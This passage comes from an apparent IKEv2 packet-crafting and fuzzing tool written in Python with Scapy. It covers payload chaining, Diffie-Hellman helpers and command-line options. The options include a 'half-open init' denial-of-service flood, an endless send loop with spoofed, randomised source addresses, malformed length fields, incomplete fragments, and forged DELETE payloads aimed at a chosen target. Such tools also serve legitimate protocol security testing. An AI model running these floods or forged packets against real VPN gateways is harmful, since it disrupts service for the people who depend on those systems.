                                payload = IKEv2_payload_IDi(load='192.168.56.1',next_payload=ike_payloads[index+1])
                            else:
                                payload = payload/IKEv2_payload_IDi(load='192.168.56.1',next_payload=ike_payloads[index+1])
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        payload = IKEv2_payload_IDi(load='192.168.56.1',next_payload='None')
                        first_payload = 'IDi'
                    else:
                        payload = payload / IKEv2_payload_IDi(load='192.168.56.1',next_payload='None')
            elif ipay == 'IDr':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                #payload = IKEv2_payload_IDr(load='192.168.56.101',next_payload="Notify")
                                payload = IKEv2_payload_IDr(load=target_IP,next_payload="Notify")
                                first_payload = 'IDr'
                            else:
                                #payload = payload/IKEv2_payload_IDr(load='192.168.56.101',next_payload="Notify")
                                payload = payload/IKEv2_payload_IDr(load=target_IP,next_payload="Notify")
                        else:
                            if (payload == None):
                                #payload = IKEv2_payload_IDr(load='192.168.56.101',next_payload=ike_payloads[index+1])
                                payload = IKEv2_payload_IDr(load=target_IP,next_payload=ike_payloads[index+1])
                                first_payload = 'IDr'
                            else:
                                #payload = payload/IKEv2_payload_IDr(load='192.168.56.101',next_payload=ike_payloads[index+1])
                                payload = payload/IKEv2_payload_IDr(load=target_IP,next_payload=ike_payloads[index+1])
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        #payload = IKEv2_payload_IDr(load='192.168.56.101',next_payload='None')
                        payload = IKEv2_payload_IDr(load=target_IP,next_payload='None')
                        first_payload = 'IDr'
                    else:
                        #payload = payload/IKEv2_payload_IDr(load='192.168.56.101',next_payload='None')
                        payload = payload/IKEv2_payload_IDr(load=target_IP,next_payload='None')
            elif ipay == 'TSi':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                payload = IKEv2_payload_TSi(number_of_TSs=1,next_payload="Notify",traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                                first_payload = 'TSi'
                            else:
                                payload = payload/IKEv2_payload_TSi(number_of_TSs=1,next_payload="Notify",traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                        else:
                            if (payload == None):
                                payload = IKEv2_payload_TSi(number_of_TSs=1,next_payload=ike_payloads[index+1],traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                                first_payload = 'TSi'
                            else:
                                payload = payload/IKEv2_payload_TSi(number_of_TSs=1,next_payload=ike_payloads[index+1],traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        payload = IKEv2_payload_TSi(number_of_TSs=1,next_payload='None',traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                        first_payload = 'TSi'
                    else:
                        payload = payload/IKEv2_payload_TSi(number_of_TSs=1,next_payload='None',traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
            elif ipay == 'TSr':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                payload = IKEv2_payload_TSr(number_of_TSs=1,next_payload="Notify",traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                                first_payload = 'TSr'
                            else:
                                payload = payload/IKEv2_payload_TSr(number_of_TSs=1,next_payload="Notify",traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                        else:
                            if (payload == None):
                                payload = IKEv2_payload_TSr(number_of_TSs=1,next_payload=ike_payloads[index+1],traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                                first_payload = 'TSr'
                            else:
                                payload = payload/IKEv2_payload_TSr(number_of_TSs=1,next_payload=ike_payloads[index+1],traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        payload = IKEv2_payload_TSr(number_of_TSs=1,next_payload='None',traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
                        first_payload = 'TSr'
                    else:
                        payload = payload/IKEv2_payload_TSr(number_of_TSs=1,next_payload='None',traffic_selector=IPv4TrafficSelector(IP_protocol_ID="All protocols",starting_address_v4= "0.0.0.0",ending_address_v4= "255.255.255.255"))
            elif ipay == 'AUTH':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'AUTH'
                                payload = IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload="Notify")
                            else:
                                payload = payload/IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload="Notify")
                        else:
                            if (payload == None):
                                payload = IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload=ike_payloads[index+1])
                                first_payload = 'AUTH'
                            else:
                                payload = payload/IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload=ike_payloads[index+1])
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        payload = IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload='None')
                        first_payload = 'AUTH'
                    else:
                        payload = payload/IKEv2_payload_AUTH(auth_type="Shared Key Message Integrity Code",load= "\xed'H\x86@IlZ\x1f\xe9\xaa\xe6_A\nR\x8a\x8b\x0f\xf1k\xd6\x9e\xd3\x96\x19\xe6\x8d\x16t\x108",next_payload='None')
            elif ipay.startswith("Notify"):
                NotifyMessage =  ipay.split('.')
                if len(NotifyMessage) < 2:
                    print(NotifyMessage,"You need to define the type of the Notify Message; exiting (006).")
                    exit(0)
                MyNotifyTypes = NotifyMessage[1].split('-')
                AllNotifyTypes = []
                if len(MyNotifyTypes)<2:
                    AllNotifyTypes.append(int(MyNotifyTypes[0]))
                else:
                    for i in range (int(MyNotifyTypes[0]),int(MyNotifyTypes[1])+1):
                        AllNotifyTypes.append(i)
                len_of_AllNotifyTypes =  len(AllNotifyTypes)
                for NotifyType in AllNotifyTypes:
                    if index < len_ike_payloads-1 + len_of_AllNotifyTypes -1:
                        len_of_AllNotifyTypes = len_of_AllNotifyTypes - 1
                        try:
                            #IKEv2_payload_Notify(type="INITIAL_CONTACT") - Use type 16384
                            #IKEv2_payload_Notify(type="EAP_ONLY_AUTHENTICATION") - Use type 16417
                            #IKEv2_payload_Notify(type="IKEV2_MESSAGE_ID_SYNC_SUPPORTED") - Use type 16420
                            if NotifyType==16431:
                                if len_of_AllNotifyTypes > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='Notify') 
                                elif ike_payloads[index+1].startswith('Notify'):
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload  = IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='Notify') 
                                    else:
                                        payload  = payload / IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='Notify') 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload=ike_payloads[index+1]) 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload=ike_payloads[index+1]) 
                            elif NotifyType==16388:
                                if len_of_AllNotifyTypes > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='Notify') 
                                elif ike_payloads[index+1].startswith('Notify'):
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='Notify') 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload=ike_payloads[index+1]) 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload=ike_payloads[index+1]) 
                            elif NotifyType==16389:
                                if len_of_AllNotifyTypes > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='Notify') 
                                elif ike_payloads[index+1].startswith('Notify'):
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='Notify') 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload=ike_payloads[index+1]) 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload=ike_payloads[index+1]) 
                            elif NotifyType==16390:
                                if len_of_AllNotifyTypes > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        if (cookie==None):
                                            payload = IKEv2_payload_Notify(type=16390,next_payload='Notify') 
                                        else:
                                            payload = IKEv2_payload_Notify(type=16390,load=cookie,next_payload='Notify') 
                                    else:
                                        if (cookie==None):
                                            payload = payload / IKEv2_payload_Notify(type=16390,next_payload='Notify') 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=16390,load=cookie,next_payload='Notify') 
                                elif ike_payloads[index+1].startswith('Notify'):
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        if (cookie==None):
                                            payload = IKEv2_payload_Notify(type=16390,next_payload='Notify') 
                                        else:
                                            payload = IKEv2_payload_Notify(type=16390,load=cookie,next_payload='Notify') 
                                    else:
                                        if (cookie==None):
                                            payload = payload / IKEv2_payload_Notify(type=16390,next_payload='Notify') 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=16390,load=cookie,next_payload='Notify') 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        if (cookie==None):
                                            payload = IKEv2_payload_Notify(type=16390,next_payload=ike_payloads[index+1]) 
                                        else:
                                            payload = IKEv2_payload_Notify(type=16390,load=cookie,next_payload=ike_payloads[index+1]) 
                                    else:
                                        if (cookie==None):
                                            payload = payload / IKEv2_payload_Notify(type=16390,next_payload=ike_payloads[index+1]) 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=16390,load=cookie,next_payload=ike_payloads[index+1]) 
                            elif NotifyType > 16439 and NotifyType < 16450:
                                if size_Notify_data > 0:
                                    if len_of_AllNotifyTypes > 0:
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            payload = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify',load=os.urandom(size_Notify_data)) 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify',load=os.urandom(size_Notify_data)) 
                                    elif ike_payloads[index+1].startswith('Notify'):
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            payload = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify',load=os.urandom(size_Notify_data)) 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify',load=os.urandom(size_Notify_data)) 
                                    else:
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            paylaod = IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1],load=os.urandom(size_Notify_data)) 
                                        else:
                                            paylaod = payload / IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1],load=os.urandom(size_Notify_data)) 
                                else:
                                    if len_of_AllNotifyTypes > 0:
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            payload = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                    elif ike_payloads[index+1].startswith('Notify'):
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            paylaod = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                        else:
                                            paylaod = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                    else:
                                        if (payload == None):
                                            first_payload = 'Notify'
                                            payload = IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1]) 
                                        else:
                                            payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1]) 
                            elif NotifyType < 65536 and NotifyType > -1:
                                if len_of_AllNotifyTypes > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                elif ike_payloads[index+1].startswith('Notify'):
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='Notify') 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1]) 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload=ike_payloads[index+1]) 
                            else:
                                print("Notify Type must be in the range 0-65535; exiting (007a)")
                                exit(0)
                        except Exception as e:
                            print(str(e), "not supported; exiting (008).")
                            exit(0)
                    else:
                        try:
                            if NotifyType==16431:
                                if (payload == None):
                                    first_payload = 'Notify'
                                    payload = IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='None') 
                                else:
                                    payload = payload / IKEv2_payload_Notify(type=16431,load= str('\x00\x02\x00\x03\x00\x04\x00\x05'),next_payload='None') 
                            elif NotifyType==16388:
                                if (payload == None):
                                    first_payload = 'Notify'
                                    payload = IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='None') 
                                else:
                                    payload = payload / IKEv2_payload_Notify(type=16388,load=os.urandom(20),next_payload='None') 
                            elif NotifyType==16389:
                                if (payload == None):
                                    first_payload = 'Notify'
                                    payload = IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='None') 
                                else:
                                    payload = payload / IKEv2_payload_Notify(type=16389,load=os.urandom(20),next_payload='None') 
                            elif NotifyType > 16439 and NotifyType < 16450:
                                if size_Notify_data > 0:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=NotifyType,next_payload='None',load=os.urandom(size_Notify_data)) 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='None',load=os.urandom(size_Notify_data)) 
                                else:
                                    if (payload == None):
                                        first_payload = 'Notify'
                                        payload = IKEv2_payload_Notify(type=NotifyType,next_payload='None') 
                                    else:
                                        payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='None') 
                            elif NotifyType < 65536 and NotifyType > -1:
                                if (payload == None):
                                    first_payload = 'Notify'
                                    payload = IKEv2_payload_Notify(type=NotifyType,next_payload='None') 
                                else:
                                    payload = payload / IKEv2_payload_Notify(type=NotifyType,next_payload='None') 
                            else:
                                print("Notify Type must be in the range 0-65535; exiting (007b)")
                                exit(0)
                        except Exception as e:
                            print(str(e), "not supported; exiting (009).")
                            exit(0)
            else:
                print(ipay," header not supported; exiting (005).")
                exit(0)
        return first_payload, payload

def create_chain(proposals,nu_of_tr_initial,ike_payloads,length_ike,SPIr,size_Notify_data,type_cert_request,responder,key_exchange,cookie,no_of_ca,target_IP,spi,spi_number,spi_other):
        #Construct the chain of IKEv2 Payloads
        first_payload = ike_payloads[0]
        if length_ike < 0:
            if first_payload.startswith("Notify"):
                first_payload="Notify"
            #print("my SPI:",my_spi.hex())
            if responder:
                ikev2 = IKEv2(init_SPI=SPIr,resp_SPI=my_spi, next_payload=first_payload, exch_type='IKE_SA_INIT', flags='Response', id=0)
            else:
                if spi == '':
                    ikev2 = IKEv2(init_SPI=my_spi,next_payload=first_payload, exch_type='IKE_SA_INIT', flags='Initiator',id=0)
                else:
                    #ikev2 = IKEv2(init_SPI=bytearray.fromhex('4dc9b679ee4a6320'),resp_SPI=bytearray.fromhex(spi),next_payload=first_payload, exch_type='INFORMATIONAL', flags='Response',id=1)
                    ikev2 = IKEv2(init_SPI=bytearray.fromhex(spi_other),resp_SPI=bytearray.fromhex(spi),next_payload=first_payload, exch_type='INFORMATIONAL', flags='Response',id=1)
        else:
            if first_payload.startswith("Notify"):
                first_payload="Notify"
            if responder:
                ikev2 = IKEv2(init_SPI=SPIr,resp_SPI=my_spi, next_payload=first_payload, exch_type='IKE_SA_INIT', flags='Response', length = length_ike,id=0)
            else:
                ikev2 = IKEv2(init_SPI=my_spi, resp_spi=SPIr,next_payload=first_payload, exch_type='IKE_SA_INIT', flags='Initiator', length = length_ike,id=0)
        first_payload,ike_payload_chain = create_chain_payloads(ike_payloads,proposals,key_exchange,my_nonce,type_cert_request,size_Notify_data,cookie,no_of_ca,target_IP,spi,spi_number)
        ikev2 = ikev2 / ike_payload_chain
        return ikev2

def get_random_source_address(subnet):
    bits = getrandbits(subnet.max_prefixlen - subnet.prefixlen)
    addr = IPv4Address(subnet.network_address + bits)
    addr_str = str(addr) #get the IPv4Address object's string representation
    return addr_str

def ike_init(dstIP,key_length,ike_payloads,list_of_proposals,length_ike,length_proposal,length_transform,nu_of_tr,size_Notify_data,type_cert_request,write_sa,read_sa,responder,SPIr,half_init,mysubnet,throttle, key_exchange,cookie,random,no_of_ca,target_IP,spi,spi_number,spi_other):
    #DEFINE THE SA HEADER(S) IF NOT TO BE READ FROM A FILE
    if not read_sa:
        proposals,nu_of_tr_initial = create_proposals(list_of_proposals,length_proposal,length_transform,nu_of_tr)
        #print("peer SPI=",SPIr)
        ikev2= create_chain(proposals,nu_of_tr_initial,ike_payloads,length_ike,SPIr,size_Notify_data,type_cert_request,responder,key_exchange,cookie,no_of_ca,target_IP,spi,spi_number,spi_other)
        #print(ikev2.show())
    #OR, READ THE SA HEADERS FROM A FILE
    else:
        ikev2 = read_sa.read()
        read_sa.close()

    if write_sa:
        write_sa.write(str(ikev2))
        write_sa.close()
    else:
        #PREPARE THE PACKET TO BE SENT
        #print("sending IKE_INIT packet(s)")
        data = IP(dst=dstIP, proto='udp')/UDP(dport=ike_destination_port, sport=ike_source_port)/ikev2
        #print(data.show())
        #print(data.payload.payload.init_SPI)
        if half_init:
            subnet = IPv4Network(mysubnet) 
            throttle=float(throttle)
            my_init_SPI=1
            init_SPI=os.urandom(32)
            if throttle !=0:
                while True:
                    init_SPI=os.urandom(32)
                    if random:
                        data.src = get_random_source_address(subnet)
                    data.payload.payload.init_SPI=init_SPI
                    send(data)
                    time.sleep(throttle)
            else:
                while True:
                    #my_init_SPI=my_init_SPI+1
                    #init_SPI=(8).to_bytes(2, byteorder='big')
                    init_SPI=os.urandom(32)
                    if random:
                        data.src = get_random_source_address(subnet)
                    data.payload.payload.init_SPI=init_SPI
                    send(data)
        else:
            try:
                packet = send(fragment(data,1450))
                print ('packet IKEv2 INIT sent')
            except Exception as e:
                print(data.show())
                print(str(e), "; exiting (004).")
                exit(0)

def get_my_mac(interface):
	try:
		mymac = scapy.layers.l2.get_if_hwaddr(interface) #my MAC address
		return mymac
	except:
		print("The interface",interface,"does not exist. Please, try again.")
		exit(0)

#when acting as a server, i.e. listen mode
def DiffieHellman(dhgroup, peer_pub_key):
    global my_private_key
    if dhgroup not in crypto.PRIMES:
        raise Exception(f'Unsupported DH Group DH_{dhgroup}')
    p, g, l = crypto.PRIMES[dhgroup]
    if (not my_private_key):
        a = random.randrange(p>>8, p)
        my_private_key = a
    else:
        a = my_private_key 
    #print("My private key:", my_private_key)
    if type(g) is tuple:
        return crypto.ec_mul(g[0], l, a, p, g[1]).to_bytes(l*2, 'big'), crypto.ec_mul(int.from_bytes(peer_pub_key, 'big'), l, a, p, g[1]).to_bytes(l*2, 'big')[:l]
    else:
        return pow(g, a, p).to_bytes(l, 'big'), pow(int.from_bytes(peer_pub_key, 'big'), a, p).to_bytes(l, 'big')

#useful if acting as the initiator
def DiffieHellman_create_public_key_only(dhgroup):
    global my_private_key
    if dhgroup not in crypto.PRIMES:
        raise Exception(f'Unsupported DH Group DH_{dhgroup}')
    p, g, l = crypto.PRIMES[dhgroup]
    if (not my_private_key):
        a = random.randrange(p>>8, p)
        my_private_key = a
    else:
        a = my_private_key 
    #print("My private key:", my_private_key)
    if type(g) is tuple:
        return crypto.ec_mul(g[0], l, a, p, g[1]).to_bytes(l*2, 'big'), a
    else:
        return pow(g, a, p).to_bytes(l, 'big'), a

#useful if acting as the initiator
def DiffieHellman_create_session_key(dhgroup, peer_pub_key, my_private_key):
    if dhgroup not in crypto.PRIMES:
        raise Exception(f'Unsupported DH Group DH_{dhgroup}')
    p, g, l = crypto.PRIMES[dhgroup]
    if type(g) is tuple:
        return crypto.ec_mul(int.from_bytes(peer_pub_key, 'big'), l, my_private_key, p, g[1]).to_bytes(l*2, 'big')[:l]
    else:
        return pow(int.from_bytes(peer_pub_key, 'big'), my_private_key, p).to_bytes(l, 'big')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='IKEv2 testing.')
    parser.add_argument('-recon', '--recon',  action="store_true", dest="recon", default=False, help="Perform recon. Send an INIT packet and print results.")
    parser.add_argument('-listen', '--listener',  action="store_true", dest="listen", default=False, help="Initiate a Listener. Listen for INIT packets, print results and respond.")
    parser.add_argument('-half-init', '--half-open-init',  action="store_true", dest="half_init", default=False, help="Initiates a half-open init attack (potential DoS). In this option, packets will not be auto-fragmented and hence, they need to be smaller than the MTU size.")
    parser.add_argument('-sub', '--subnet', action="store", default = '192.168.1.0/24', dest="subnet", help="the IPv4 subnet range to use for generating spoofed source addresses in case of half_init.")
    parser.add_argument('-rand', '--randomise',  action="store_true", dest="random", default=False, help="Randomise the source address in case of half_init")
    parser.add_argument('-throttle', '--throttle', action="store", dest="throttle", default=0,help="The time to wait (in seconds) before sending the next packet in case of DoS attempt(default: 0).")
    parser.add_argument('-i', '--iface', action="store", default = 'lo', dest="interface", help="the interface to use for sniffing.")
    parser.add_argument('-d', '--destination', action="store", default = '127.0.0.1', dest="destination", help="the address of the target.")
    parser.add_argument('-p', '--port', action="store", dest="port", default=500, help="the port of the target.")
    parser.add_argument('-sp', '--sport', action="store", dest="sport", default=500,help="the source port of the packet to be sent.")
    parser.add_argument('-pr', '--proposals', action="store", dest="proposals", default="1.12,3.12,2.5,4.2",help="the Proposals and the included Transformations in the IKE_INIT messages (e.g. 1.12 means Encryption(1), AES128(12). Transformations included in a Proposal are separated with a ',', whilst proposals themselves are separated with '\'. Example: 1.1,2.1,3.1/1.2,2.1,3.3/1.1,2.1,3.1,2.2/3.4,4.4,4.3")
    parser.add_argument('-pr2', '--proposals2', action="store", dest="proposals2", default="1.12",help="the Proposals and the included Transformations in the IKE_AUTH message (e.g. 1.12 means Encryption(1), AES128(12). Transformations included in a Proposal are separated with a ',', whilst proposals themselves are separated with '\'. Example: 1.1,2.1,3.1/1.2,2.1,3.3/1.1,2.1,3.1,2.2/3.4,4.4,4.3")
    parser.add_argument('-kl', '--key_length', action="store", dest="klength", default=256,help="the length of the key.")
    parser.add_argument('-nt', '--number_of_transformations', action="store", dest="nu_of_tr", default=-1,help="The number of transformations >=0 to be included in the corresponding field of the Proposals; when the default value is used, it is auto-calculated based on the rest of the input.")
    parser.add_argument('-ip', '--ike_payloads', action="store", dest="ike_payloads", default="SA,KE,Nonce",help="A comma-separated list of IKEv2 identifiers Payloads to be used for IKE_INIT. Example: SA refers to Security Association, KE refers to Key Exchange, etc.")
    parser.add_argument('-ip2', '--ike_payloads2', action="store", dest="ike_payloads2", default="IDr,IDi,AUTH,TSi,TSr",help="A comma-separated list of IKE identifiers Payloads. Example: SA refers to Security Association, KE refers to Key Exchange, etc.")
    parser.add_argument('-li', '--length_of_ike_hdr', action="store", dest="length_ike", default=-1,help="The length of the ikev2 header, >=0, to be included in the corresponding field of the IKEv2 header; when the default value is used, it is auto-calculated based on the rest of the input.")
    parser.add_argument('-lp', '--length_of_proposals_payload', action="store", dest="length_proposal", default=-1,help="The length of the proposals payload, >=0, to be included in the corresponding field of the Proposal payload; when the default value is used, it is auto-calculated based on the rest of the input.")
    parser.add_argument('-lt', '--length_of_transofrm_payload', action="store", dest="length_transform", default=-1,help="The length of the Transformations payload, >=0, to be included in the corresponding field of the Transformations payload; when the default value is used, it is auto-calculated based on the rest of the input.")
    parser.add_argument('-sN', '--size_of_Notify_data', action="store", dest="size_Notify_data", default=-1,help="The size of Notify data (for Notify Types in [16440,16449]), >=0")
    parser.add_argument('-crt', '--type_of_certificate_request', action="store", dest="type_cert_request", default=4,help="The Type of the Certificate Request Payload (if present).")
    parser.add_argument('-no_of_ca', '--number_of_ca', action="store", dest="no_of_ca", default=1,help="The number of the Certificate Authorities to be included in a Certificate Request(default: 1).")
    parser.add_argument('-stimeout', '--sniff_timeout', action="store", dest="stimeout", default=10,help="The time to sniff when in listen mode, in seconds (default: 10).")
    parser.add_argument('-of', '--output_file', action="store", dest="output_file", help="the filename where IKEv2 header(s) will be stored (for later usage).")
    parser.add_argument('-if', '--input_file', action="store", dest="input_file", help="the filename from where IKEv2 header(s) will be restored; in this case, other arguments related with IKEv2 headers are ignored.")
    parser.add_argument('-threads', '--no_of_threads', action="store", dest="threads", default=10,help="The number of threads > 0 to be used for half-init DoS attack")
    parser.add_argument('-fr', '--number_of_fragments', action="store", dest="fragments", default=0,help="The number of fragments > 0 to be used for IKEv2 fragmentation.")
    parser.add_argument('-ifr', '--inclompete_fragment',  action="store_true", dest="incomplete_fragment", default=False, help="Don't send the last fragment (in case of fragmentation)")
    parser.add_argument('-spi', '--SPIs', action="store", dest="spi", default='', help="The SPIs to be used for DELETE payload.")
    parser.add_argument('-no_of_spi', '--number_of_SPIs', action="store", dest="spi_number", default=0,help="The number of SPIs >= 0 to be used for DELETE payload.")
    parser.add_argument('-spi_other', '--SPI_other', action="store", dest="spi_other", default='', help="The SPI of the other end for the IKE header to be used for DELETE payload.")
    values = parser.parse_args()

    ###LETS DO SOME CHECKS FIRST TO SEE IF WE CAN WORK###	
    if values.output_file:
        fw = open(values.output_file,'w')
    else:
        fw = None
    if values.input_file:
        fi = open(values.input_file,'r')
    else:
        fi = None

    if os.geteuid() != 0 and not fw:
        print("You must be root to send packets.")
        exit(1)  

    #INITIALISATION
    my_mac = get_my_mac(values.interface)
    my_nonce = os.urandom(32)
    my_spi = os.urandom(8)
    #print("my nonce:",my_nonce.hex())
    #print("my SPI:",my_spi.hex())

    #if Responder, public/private key is created inside the handler of the Sniffer 
    if (values.recon):
    #if ((values.listen and values.recon) or values.recon):
        DHGROUP =2 
        my_public_key,my_private_key=DiffieHellman_create_public_key_only(DHGROUP)
        #print("my Public key: ",my_public_key.hex())

    #CONFIGURE IPTABLES
    if(sys.platform.startswith('linux')):
        subprocess.call(['iptables', '-I', 'OUTPUT', '1', '-p', 'icmp', '--icmp-type', 'destination-unreachable', '-d', values.destination, '-j', 'DROP'])
    else:
        print("This is not a Linux system. You must configure the firewall on your own")

    ###set variables
    target_IP =values.destination
    ike_destination_port = int(values.port)
    ike_source_port = int(values.sport)
    key_length = int(values.klength)

    #IKE Payloads
    IKE_payloads = values.ike_payloads.split(",")
    IKE_payloads2 = values.ike_payloads2.split(",")

    #Proposals and Transformations 
